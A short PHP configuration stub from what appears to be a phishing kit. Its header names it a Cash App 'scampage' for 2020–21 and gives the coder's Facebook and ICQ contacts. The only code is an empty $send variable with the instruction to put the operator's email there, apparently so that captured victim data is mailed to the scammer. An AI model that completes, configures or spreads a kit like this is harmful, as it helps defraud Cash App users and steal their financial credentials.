﻿<?php

/* 

|         CA💲HAPP          |
|    CODED BY MAGUZCODER   |
|   CA💲HAPP SCAMPAGE 20-21 |

Do you want to contact me ?

FACEBOOK➤fb.com/MaguZCoder/
ICQ➤@MaguzCoder

*/
//<========================>//
$send = ""; // PUT UR EMAIL HERE
//<========================>//
?>